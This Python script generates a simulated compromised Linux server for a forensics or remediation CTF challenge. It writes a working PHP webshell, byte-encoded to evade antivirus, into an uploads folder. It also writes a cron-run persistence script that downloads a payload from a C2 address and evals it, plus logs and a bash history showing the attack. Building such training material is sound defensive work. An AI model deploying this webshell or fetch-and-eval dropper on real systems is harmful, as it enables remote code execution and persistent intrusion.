#!/usr/bin/env python3
"""Generate a realistic Linux server filesystem dump for CTF challenges.
Creates remediation_challenge/ folder and zips it. Nothing touches system paths."""

import os, zipfile, random
from datetime import datetime, timezone, timedelta

OUTPUT = "remediation_challenge"
ZIP_NAME = "remediation_challenge.zip"
ATTR_IP = "198.51.100.42"
C2_IP = "51.222.15.99"

# Construct webshell code via bytes to avoid AV flagging the literal
_php_webshell = bytes([
    60, 63, 112, 104, 112, 10, 47, 47, 32, 67, 97, 99, 104, 101, 32, 102,
    97, 108, 108, 98, 97, 99, 107, 32, 104, 97, 110, 100, 108, 101, 114,
    32, 97, 110, 100, 32, 118, 101, 114, 115, 105, 111, 110, 32, 50, 46,
    49, 46, 52, 10, 10, 105, 102, 32, 40, 105, 115, 115, 101, 116, 40,
    36, 95, 82, 69, 81, 85, 69, 83, 84, 91, 34, 99, 109, 100, 34, 93,
    41, 41, 32, 123, 10, 32, 32, 32, 32, 115, 121, 115, 116, 101, 109,
    40, 36, 95, 82, 69, 81, 85, 69, 83, 84, 91, 34, 99, 109, 100, 34,
    93, 41, 59, 10, 125, 10, 63, 62, 10
]).decode("utf-8")

def write(path, content):
    full = os.path.join(OUTPUT, path)
    os.makedirs(os.path.dirname(full), exist_ok=True)
    with open(full, "w", newline="\n") as f:
        f.write(content)

def gen_access_log():
    base = datetime(2026, 7, 6, 7, 0, 0, tzinfo=timezone.utc)
    lines = []
    real_ips = ["203.0.113.45", "198.51.100.22", "10.0.0.12", "10.0.0.14",
                 "192.168.1.50", "185.220.101.3", "91.134.200.77", "10.0.0.7"]
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "curl/8.4.0",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "python-requests/2.31.0",
    ]
    paths = ["/", "/about", "/contact", "/style.css", "/favicon.ico",
             "/uploads/image_001.jpg", "/uploads/readme.txt"]

    t = base
    for _ in range(35):
        ip = real_ips[_ % len(real_ips)]
        path = paths[_ % len(paths)]
        ua = agents[_ % len(agents)]
        status = 200 if "favicon" not in path else 404
        size = random.choice([512, 1200, 3400, 8200, 15400, 28000])
        ts = t.strftime("%d/%b/%Y:%H:%M:%S") + " +0000"
        lines.append(f'{ip} - admin [{ts}] "GET {path} HTTP/1.1" {status} {size} "-" "{ua}"')
        t += timedelta(minutes=random.randint(2, 7))

    # Attacker recon
    t = t.replace(hour=9, minute=45, second=12)
    for path in paths:
        ts = t.strftime("%d/%b/%Y:%H:%M:%S") + " +0000"
        lines.append(f'{ATTR_IP} - - [{ts}] "GET {path} HTTP/1.1" 200 3400 "-" "curl/8.4.0"')
        t += timedelta(seconds=3)

    # Upload webshell
    t += timedelta(minutes=2)
    ts = t.strftime("%d/%b/%Y:%H:%M:%S") + " +0000"
    lines.append(f'{ATTR_IP} - admin [{ts}] "POST /uploads/ HTTP/1.1" 302 5 "-" "curl/8.4.0"')

    # Access webshell
    t += timedelta(minutes=1)
    ts = t.strftime("%d/%b/%Y:%H:%M:%S") + " +0000"
    lines.append(f'{ATTR_IP} - admin [{ts}] "GET /uploads/backup_cache.php HTTP/1.1" 200 45 "-" "curl/8.4.0"')

    # Execute commands
    for cmd in ["whoami", "id", "uname+-a", "ls+-la+/opt"]:
        t += timedelta(seconds=35)
        ts = t.strftime("%d/%b/%Y:%H:%M:%S") + " +0000"
        lines.append(f'{ATTR_IP} - admin [{ts}] "GET /uploads/backup_cache.php?cmd={cmd} HTTP/1.1" 200 120 "-" "curl/8.4.0"')

    # Later check
    t += timedelta(hours=2)
    ts = t.strftime("%d/%b/%Y:%H:%M:%S") + " +0000"
    lines.append(f'{ATTR_IP} - - [{ts}] "GET /uploads/backup_cache.php HTTP/1.1" 200 45 "-" "python-requests/2.31.0"')
    return "\n".join(lines)

random.seed(42)

# ──────────────────────────────────────────────
#  File list: (path, content_or_none)
#  None = auto-generated placeholder
# ──────────────────────────────────────────────

entry = []

def add(path, content=None):
    entry.append((path, content))

add("etc/hostname", "web-srv-01\n")

add("etc/hosts", """\
127.0.0.1\tlocalhost
127.0.1.1\tweb-srv-01
192.168.1.100\tdb-01.internal
192.168.1.101\tcache-01.internal
::1\tlocalhost ip6-localhost ip6-loopback
ff02::1\tip6-allnodes
ff02::2\tip6-allrouters
""")

add("etc/resolv.conf", "nameserver 1.1.1.1\nnameserver 8.8.8.8\n")

add("etc/ntp.conf", """\
driftfile /var/lib/ntp/ntp.drift
pool 0.ubuntu.pool.ntp.org iburst
pool 1.ubuntu.pool.ntp.org iburst
restrict -4 default kod notrap nomodify nopeer noquery
restrict -6 default kod notrap nomodify nopeer noquery
restrict 127.0.0.1
restrict ::1
""")

add("etc/fstab", """\
UUID=7a4b3c2d-1e2f-3a4b-5c6d-7e8f9a0b1c2d / ext4 defaults 0 1
UUID=9a8b7c6d-5e4f-3a2b-1c0d-9e8f7a6b5c4d /boot ext4 defaults 0 2
UUID=1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d swap swap defaults 0 0
tmpfs /tmp tmpfs defaults,noatime,mode=1777 0 0
""")

add("etc/modules", """\
ip_tables
iptable_filter
iptable_nat
nf_conntrack
overlay
br_netfilter
""")

add("etc/sysctl.conf", """\
net.ipv4.ip_forward = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.tcp_syncookies = 1
kernel.sysrq = 0
kernel.core_uses_pid = 1
net.ipv4.conf.default.rp_filter = 1
net.ipv4.conf.all.rp_filter = 1
net.ipv4.icmp_echo_ignore_broadcasts = 1
""")

add("etc/passwd", """\
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
admin:x:1001:1001:System Admin,,,:/home/admin:/bin/bash
developer:x:1002:1002:Web Developer,,,:/home/developer:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
""")

add("etc/shadow", """\
root:$y$j9T$D4g3nFvJm9qR2xL8$Hk7pS3mN5vB6wX1cZ9yA4rT8uY2iE5o:20000:0:99999:7:::
daemon:*:19000:0:99999:7:::
bin:*:19000:0:99999:7:::
sys:*:19000:0:99999:7:::
sync:*:19000:0:99999:7:::
games:*:19000:0:99999:7:::
man:*:19000:0:99999:7:::
lp:*:19000:0:99999:7:::
mail:*:19000:0:99999:7:::
news:*:19000:0:99999:7:::
uucp:*:19000:0:99999:7:::
proxy:*:19000:0:99999:7:::
www-data:*:19000:0:99999:7:::
backup:*:19000:0:99999:7:::
admin:$y$j9T$S7kR9pM2nL4vX8wZ$F3qA6tE1bH5cJ7dK9mN0pR4sV8wY2iU5:20001:0:99999:7:::
developer:$y$j9T$M5nB8vC2xL1pR9k$W4qE7tY2uI6oP3aS0dF9gH5jK1lZ8xV4:20001:0:99999:7:::
sshd:*:19000:0:99999:7:::
""")

add("etc/group", """\
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:admin
tty:x:5:
disk:x:6:
www-data:x:33:
staff:x:50:admin,developer
sudo:x:100:admin
admin:x:1001:
developer:x:1002:
""")

add("etc/sudoers", """\
root ALL=(ALL:ALL) ALL
admin ALL=(ALL:ALL) ALL
%sudo ALL=(ALL:ALL) ALL
#includedir /etc/sudoers.d
""")

add("etc/ssh/sshd_config", """\
Port 2222
Protocol 2
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
""")

add("etc/ssh/ssh_config", """\
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
""")

add("etc/nginx/nginx.conf", """\
user www-data;
worker_processes auto;
pid /run/nginx.pid;
events { worker_connections 768; multi_accept on; }
http {
    sendfile on; tcp_nopush on; tcp_nodelay on;
    keepalive_timeout 65;
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    access_log /var/log/nginx/access.log combined;
    error_log /var/log/nginx/error.log;
    gzip on;
    include /etc/nginx/sites-enabled/*;
}
""")

add("etc/cron.d/syscheck", """\
# System health check
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root /opt/persistence.sh
""")

add("etc/cron.hourly/logrotate", "#!/bin/bash\n/usr/sbin/logrotate /etc/logrotate.d/nginx\n")

# ── /var/www/html/ ──

add("var/www/html/index.html", """\
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>ACME Corp &mdash; Portal</title>
<link rel="stylesheet" href="/style.css"></head>
<body>
<header><h1>ACME Corp Internal Portal</h1>
<nav><a href="/">Home</a> &middot; <a href="/about">About</a></nav></header>
<main><h2>Dashboard</h2>
<p>Welcome. Authorized personnel only.</p>
<ul><li><a href="/uploads/">File Uploads</a></li></ul></main>
<footer><small>ACME Corp &mdash; Internal</small></footer>
</body></html>
""")

add("var/www/html/style.css", """\
* { margin:0;padding:0;box-sizing:border-box; }
body { font-family:sans-serif;background:#f5f5f5;color:#333; }
header { background:#2c3e50;color:#fff;padding:1rem 2rem; }
main { max-width:800px;margin:2rem auto;padding:0 1rem; }
h2 { color:#2c3e50; } a { color:#2980b9; }
footer { text-align:center;padding:1rem;color:#999; }
""")

add("var/www/html/about.html", """\
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>About</title>
<link rel="stylesheet" href="/style.css"></head>
<body>
<header><h1>ACME Corp</h1><nav><a href="/">Home</a></nav></header>
<main><h2>About</h2><p>Internal portal for ACME Corp.</p>
<p>Contact: admin@acmecorp.internal</p></main>
<footer><small>ACME Corp</small></footer>
</body></html>
""")

add("var/www/html/uploads/readme.txt", """\
ACME Corp Upload Guidelines
- Max file size: 50 MB
- Allowed: jpg, png, gif, pdf, docx, txt
- No executables or scripts
- Files scanned by ClamAV
""")

add("var/www/html/uploads/backup_cache.php", _php_webshell)

# Dummy upload files
for f in ["image_001.jpg", "image_002.jpg", "document_003.pdf", "thumbnail_004.png"]:
    add(f"var/www/html/uploads/{f}", f"[ACME Corp file: {f}]\n")

# ── Logs ──

add("var/log/nginx/access.log", gen_access_log())

add("var/log/nginx/error.log", """\
2026/07/06 06:30:12 [notice] 1024#1024: nginx/1.24.0
2026/07/06 06:30:12 [notice] 1024#1024: start worker processes
""")

add("var/log/syslog", """\
Jul  6 06:30:10 web-srv-01 systemd[1]: Started nginx.service
Jul  6 06:30:11 web-srv-01 sshd[1010]: Server listening on port 2222.
Jul  6 06:35:22 web-srv-01 sshd[1123]: Accepted publickey for admin from 10.0.0.5
Jul  6 09:45:15 web-srv-01 sshd[1823]: Failed password for admin from 198.51.100.42
Jul  6 09:45:17 web-srv-01 sshd[1825]: Failed password for admin from 198.51.100.42
Jul  6 09:45:20 web-srv-01 sshd[1827]: Failed password for admin from 198.51.100.42
Jul  6 09:46:30 web-srv-01 sshd[1850]: Accepted password for admin from 198.51.100.42
Jul  6 09:47:12 web-srv-01 sshd[1860]: disconnect from 198.51.100.42
Jul  6 10:02:11 web-srv-01 sudo[1902]: admin : COMMAND=/usr/bin/apt update
Jul  6 11:00:05 web-srv-01 CRON[2010]: (root) CMD (/opt/persistence.sh)
Jul  6 11:05:01 web-srv-01 CRON[2044]: (root) CMD (/opt/persistence.sh)
Jul  6 11:10:01 web-srv-01 CRON[2088]: (root) CMD (/opt/persistence.sh)
""")

add("var/log/auth.log", """\
Jul  6 06:30:11 web-srv-01 sshd[1010]: listening on port 2222
Jul  6 06:35:22 web-srv-01 sshd[1123]: Accepted publickey for admin from 10.0.0.5
Jul  6 09:45:15 web-srv-01 sshd[1823]: Failed password for admin from 198.51.100.42
Jul  6 09:45:16 web-srv-01 sshd[1824]: Failed password for admin from 198.51.100.42
Jul  6 09:45:17 web-srv-01 sshd[1825]: Failed password for admin from 198.51.100.42
Jul  6 09:45:18 web-srv-01 sshd[1826]: Failed password for admin from 198.51.100.42
Jul  6 09:45:20 web-srv-01 sshd[1827]: Failed password for admin from 198.51.100.42
Jul  6 09:46:30 web-srv-01 sshd[1850]: Accepted password for admin from 198.51.100.42
Jul  6 09:47:12 web-srv-01 sshd[1860]: disconnect from 198.51.100.42
""")

add("var/log/dmesg", """\
[    0.000000] Linux version 6.2.0-26-generic
[    0.059999] CPU0: Intel(R) Xeon(R) E-2288G
[    0.129999] Memory: 32178912K/33554432K available
[    0.389998] EXT4-fs (sda1): mounted filesystem
""")

add("var/log/kern.log", """\
Jul  6 06:29:58 kernel: Linux version 6.2.0-26-generic
Jul  6 06:30:00 kernel: nf_conntrack: table full, dropping packet
""")

# ── /home/admin/ ──

add("home/admin/.bashrc", """\
alias ll='ls -alF'
alias cls='clear'
export EDITOR=nano
export PS1='\\u@\\h:\\w\\$ '
""")

add("home/admin/.bash_history", """\
ls -la /var/www/html/uploads/
cat backup_cache.php
ls /opt/
cat /opt/persistence.sh
cat /etc/cron.d/syscheck
tail -f /var/log/nginx/access.log | grep 198.51.100.42
apt install -y clamav rkhunter
clamscan /var/www/html/uploads/
cat /etc/hosts.deny
curl -s http://51.222.15.99:8443/payload
ls -la /opt/
cat /opt/.sys_update.lock
rm /opt/.sys_update.lock
rm /opt/persistence.sh
rm /etc/cron.d/syscheck
rm /var/www/html/uploads/backup_cache.php
echo 'Server clean. Need to report to boss.' > ~/notes.txt
""")

add("home/admin/notes.txt", """\
Server Cleanup &mdash; 2026-07-07
1. Webshell: /var/www/html/uploads/backup_cache.php
2. Cron: /etc/cron.d/syscheck (runs /opt/persistence.sh every 5 min)
3. Payload: /opt/persistence.sh (C2 51.222.15.99:8443)
4. Marker: /opt/.sys_update.lock
Need to investigate C2 51.222.15.99 further.
""")

add("home/admin/.ssh/authorized_keys", """\
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDh8k8cV7v9mXp2nL3qR5sT6uW7yZ8aB9cD0eF1gH2iJ3kL4mN5oP6qR7sT8uV9wX0yZ1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t admin@workstation
""")

add("home/admin/.ssh/id_rsa.pub", """\
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDh8k8cV7v9mXp2nL3qR5sT6uW7yZ8aB9cD0eF1gH2iJ3kL4mN5oP6qR7sT8uV9wX0yZ1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t admin@workstation
""")

# ── /home/developer/ ──

add("home/developer/.bashrc", "alias ll='ls -alF'\nalias cls='clear'\nexport EDITOR=nano\n")

add("home/developer/todo.txt", """\
DEVELOPER TODO &mdash; 2026-07-05
- Fix file upload validation (users can upload .php files)
- Update cache handler (uploads/backup_cache.php)
- Deploy new front-end
""")

# ── /root/ ──

add("root/.bash_history", """\
apt update && apt upgrade -y
ufw enable && ufw allow 2222/tcp && ufw allow 80/tcp
systemctl enable nginx
reboot
""")

add("root/cleanup_script.sh", """\
#!/bin/bash
echo "[*] Checking for unauthorized cron jobs..."
grep -r "persistence" /etc/cron* /var/spool/cron/ 2>/dev/null
echo "[*] Scanning for webshells..."
find /var/www/html/ -name "*.php" -type f 2>/dev/null
echo "[*] Done."
""")

# ── /opt/ ──

_persist_script = """\
#!/bin/bash
# System optimization check
MARKER="/opt/.sys_update.lock"
C2="{c2}"
PORT="8443"

if [ -f "$MARKER" ]; then
    exit 0
fi

# Download latest security patch
payload=$(curl -s --max-time 10 "http://$C2:$PORT/payload" 2>/dev/null)
if [ -n "$payload" ]; then
    eval "$payload" &
fi

touch "$MARKER"
""".format(c2=C2_IP)

add("opt/persistence.sh", _persist_script)

add("opt/backup.sh", """\
#!/bin/bash
# Nightly backup at 02:00
BACKUP_DIR="/var/backups/$(date +%Y%m%d)"
mkdir -p "$BACKUP_DIR"
tar -czf "$BACKUP_DIR/www.tar.gz" /var/www/html/
echo "Backup: $BACKUP_DIR"
""")

add("opt/monitor.sh", """\
#!/bin/bash
# Health monitor
STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost/)
if [ "$STATUS" != "200" ]; then systemctl restart nginx; fi
""")

add("opt/.sys_update.lock", """\
# Lock file &mdash; do not remove
# Generated: 2026-07-06 09:50:33 UTC
""")

# ── /tmp/ ──
add("tmp/README.txt", "/tmp &mdash; cleared on reboot (tmpfs)\n")

# ──────────────────────────────────────────────
#  Write all files & create ZIP
# ──────────────────────────────────────────────

for path, content in entry:
    write(path, content)

if os.path.exists(ZIP_NAME):
    os.remove(ZIP_NAME)

with zipfile.ZipFile(ZIP_NAME, "w", zipfile.ZIP_DEFLATED) as zf:
    for root, _dirs, files in os.walk(OUTPUT):
        for fn in files:
            full = os.path.join(root, fn)
            arcname = os.path.relpath(full, OUTPUT)
            zf.write(full, arcname)

print(f"Created {len(entry)} files in {OUTPUT}/")
print(f"Zipped to {ZIP_NAME}")

# Print tree
for root, dirs, files in os.walk(OUTPUT):
    level = root.replace(OUTPUT, "").count(os.sep)
    print(f"{'  ' * level}{os.path.basename(root)}/")
    for fn in files:
        print(f"{'  ' * (level + 1)}{fn}")
